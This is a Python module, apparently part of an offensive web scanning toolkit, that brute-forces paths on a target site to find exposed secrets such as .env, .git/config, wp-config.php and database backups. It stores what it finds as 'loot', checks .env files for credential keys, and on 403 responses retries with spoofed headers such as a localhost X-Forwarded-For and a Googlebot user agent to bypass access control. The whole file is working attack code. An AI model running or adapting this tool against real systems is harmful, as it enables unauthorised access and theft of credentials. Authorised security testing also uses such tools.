"""Directory/file brute-force with 403 bypass and DOM-based soft-404 detection.

Soft-404 detection uses the structural shape of the parsed HTML (tag counts,
script count, link count, presence of `<main>`, framework markers) rather
than raw-text length. A candidate response is treated as real loot only when
its DOM differs from the baseline on at least 2 structural dimensions AND
it is not a recognized SPA shell page.
"""

from __future__ import annotations

import logging
import random
import re
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher
from typing import Any
from urllib.parse import urljoin, urlparse

from bs4 import BeautifulSoup

from asynx6.core.exceptions import FuzzError
from asynx6.core.http import HttpClient
from asynx6.core.models import LootItem
from asynx6.core.validators import safe_filename

log = logging.getLogger(__name__)

# Deterministic suffix for the SPA baseline probe path. Stable across calls
# so HTTP mocks can pin responses to it.
_BASELINE_PROBE_SUFFIX = "asynx6-baseline-probe"

_BASE_WORDLIST = [
    ".env", ".git/config", "config.php", "wp-config.php", "backup.sql",
    "db.sql", "admin/", "login/", "phpmyadmin/", "api/",
    "backup/", ".htaccess", "server-status", "composer.json", "artisan",
]
_LARAVEL = [
    "storage/logs/laravel.log", "storage/framework/views/",
    "bootstrap/cache/config.php", ".env.backup", ".env.save", ".env.local",
]
_AGGRESSIVE = [
    "administrator/", "web.config", "package.json", "docker-compose.yml",
    ".env.example", "logs/", "error_log", "sql.php", "info.php",
    "dev/", "staging/", "v1/", "v2/", "test/", "old/", "public/.env",
]

_BYPASS_HEADERS_TEMPLATE = {
    "X-Original-URL": "{path}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "X-Scanner": "Asynx6/2.0",
}

# SPA framework shell markers. If both baseline AND candidate carry the same
# marker, the candidate is almost certainly the same shell page (soft-404).
_SPA_MARKERS = (
    "__NEXT_DATA__",        # Next.js
    "__NUXT__",             # Nuxt
    "ng-version",           # Angular
    "data-server-rendered", # Vue SSR
    "id=\"app\"",           # Vue default mount
    "id=\"root\"",           # React default mount
)

# Threshold for "two responses are essentially the same shell page" via
# SequenceMatcher ratio on rendered text.
_SHELL_SIMILARITY_THRESHOLD = 0.85

# Minimum number of structural dimensions that must differ for a candidate
# to be considered genuinely different from the baseline (real loot).
_MIN_DIFF_DIMENSIONS = 2


def _extract_keywords(content: str) -> list[str]:
    """Top meaningful words from `content` for dynamic wordlist extension."""
    if not content:
        return []
    stop = {"the", "and", "with", "home", "contact", "about", "services",
            "login"}
    words = re.findall(r"\w+", content.lower())
    meaningful = [w for w in words if len(w) > 4 and w not in stop]
    return [w for w, _ in Counter(meaningful).most_common(10)]


def _build_wordlist(url: str, aggressive: bool, baseline: str | None) -> list[str]:
    domain = urlparse(url).netloc.split(":")[0].split(".")[0]
    wl = list(_BASE_WORDLIST) + list(_LARAVEL)
    if baseline:
        for kw in _extract_keywords(baseline):
            wl.extend([f"{kw}/", f"admin-{kw}/", f"api/{kw}/",
                       f"config-{kw}.php", f"{kw}.zip"])
    for ext in ("zip", "rar", "tar.gz", "sql", "bak", "old", "php.bak", "tar", "7z"):
        wl.extend([f"{domain}.{ext}", f"backup.{ext}", f"site.{ext}"])
    if aggressive:
        wl.extend(_AGGRESSIVE)
    seen: set[str] = set()
    return [w for w in wl if not (w in seen or seen.add(w))]


def _dom_signature(soup: BeautifulSoup) -> tuple[int, int, int, int, int, int]:
    """Return a 6-tuple structural fingerprint of an HTML document.

    Dimensions: (tag_count, text_len, script_count, link_count, has_main,
    spa_marker_hits). Used to compare the baseline against candidate paths.
    """
    tags = soup.find_all()
    scripts = soup.find_all("script")
    links = soup.find_all("link")
    text = soup.get_text(" ", strip=True)
    has_main = 1 if soup.find("main") else 0
    raw = str(soup)
    spa_hits = sum(1 for m in _SPA_MARKERS if m in raw)
    return (
        len(tags),
        len(text),
        len(scripts),
        len(links),
        has_main,
        spa_hits,
    )


def _signature_diff(a: tuple[int, ...], b: tuple[int, ...]) -> int:
    """Count how many dimensions of two signatures differ."""
    return sum(1 for x, y in zip(a, b) if x != y)


def _text_similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a, b).ratio()


def _is_spa_soft404(candidate_soup: BeautifulSoup,
                    baseline_soup: BeautifulSoup,
                    candidate_text: str,
                    baseline_text: str) -> bool:
    """Determine whether `candidate` is structurally just the SPA shell.

    Returns True (i.e. it IS a soft-404) when:
      * baseline looks like an SPA shell (has SPA marker), AND
      * candidate has the SAME spa_marker count as baseline, AND
      * either:
          - structural diff between DOM signatures is below
            `_MIN_DIFF_DIMENSIONS`, OR
          - rendered text similarity is ≥ `_SHELL_SIMILARITY_THRESHOLD`.
    """
    sig_a = _dom_signature(baseline_soup)
    sig_b = _dom_signature(candidate_soup)
    if sig_a[5] == 0:
        return False  # baseline is not an SPA shell, no soft-404 heuristic
    if sig_a[5] != sig_b[5]:
        return False  # SPA marker count differs → not the same shell
    if _signature_diff(sig_a, sig_b) < _MIN_DIFF_DIMENSIONS:
        return True
    if _text_similarity(baseline_text, candidate_text) >= _SHELL_SIMILARITY_THRESHOLD:
        return True
    return False


def _is_real_loot(path: str, text: str, content: bytes) -> bool:
    """Sanity check for individual response bodies."""
    if len(content) < 15:
        return False
    if path.endswith(".env"):
        return any(x in text for x in ("DB_", "APP_", "KEY=", "MAIL_"))
    return True


def run(
    url: str,
    *,
    client: HttpClient,
    aggressive: bool = False,
    threads: int = 25,
    content_baseline: str | None = None,
) -> list[dict[str, Any]]:
    """Fuzz directories/files. Returns list of {url, status, type, content}."""
    if not url.endswith("/"):
        url += "/"
    wordlist = _build_wordlist(url, aggressive, content_baseline)

    # SPA baseline: fetch a known-missing path, parse it, and snapshot
    # both its structural DOM signature AND its rendered text. The probe
    # path is deterministic so test fixtures and HTTP mocks can pin it.
    baseline_url = urljoin(url, _BASELINE_PROBE_SUFFIX)
    baseline_resp = client.get(baseline_url)
    baseline_text = baseline_resp.text if baseline_resp else ""
    baseline_soup = BeautifulSoup(baseline_text, "html.parser") if baseline_text \
        else BeautifulSoup("", "html.parser")
    baseline_len = len(baseline_resp.content) if baseline_resp else -1
    baseline_sig = _dom_signature(baseline_soup)

    results: list[dict[str, Any]] = []

    def _check(path: str) -> dict[str, Any] | None:
        time.sleep(random.uniform(0.1, 0.4))
        target = urljoin(url, path)
        r = client.get(target, allow_redirects=False)
        if r is None:
            return None
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if loc in (url, "/", urlparse(url).path):
                return None
        if r.status_code == 200:
            ct = r.headers.get("Content-Type", "").lower()
            # Sensitive-file paths returning text/html are usually SPA shells.
            if any(p in path for p in (".env", ".sql", ".htaccess", ".git")) \
                    and "text/html" in ct:
                return None
            # Plain-text / JSON / binary responses: cheap textual diff is enough.
            if "text/html" not in ct:
                if baseline_resp is not None and (
                    r.text == baseline_text or len(r.content) == baseline_len
                ):
                    return None
                if not _is_real_loot(path, r.text, r.content):
                    return None
                return {
                    "url": target, "status": 200, "type": "Sensitive File",
                    "content": r.content,
                    "is_binary": "image" in ct or "octet" in ct,
                }
            # HTML responses: DOM-based soft-404 detection.
            candidate_soup = BeautifulSoup(r.text, "html.parser")
            candidate_sig = _dom_signature(candidate_soup)
            if _signature_diff(baseline_sig, candidate_sig) < _MIN_DIFF_DIMENSIONS:
                return None  # same shape as SPA shell
            if _is_spa_soft404(candidate_soup, baseline_soup, r.text, baseline_text):
                return None
            if not _is_real_loot(path, r.text, r.content):
                return None
            return {
                "url": target, "status": 200, "type": "Sensitive File",
                "content": r.content,
                "is_binary": "image" in ct or "octet" in ct,
            }
        if r.status_code == 403:
            bypass = dict(_BYPASS_HEADERS_TEMPLATE)
            bypass["X-Original-URL"] = path
            bypass["Referer"] = url
            r2 = client.get(target, headers=bypass, allow_redirects=False)
            if r2 is not None and r2.status_code == 200 \
                    and _is_real_loot(path, r2.text, r2.content):
                return {"url": target, "status": 200,
                        "type": "403 BYPASS SUCCESS", "content": r2.content}
        return None

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for fut in as_completed([ex.submit(_check, p) for p in wordlist]):
                r = fut.result()
                if r:
                    results.append(r)
    except Exception as exc:  # noqa: BLE001
        raise FuzzError(f"Directory fuzz failed: {exc}") from exc
    return results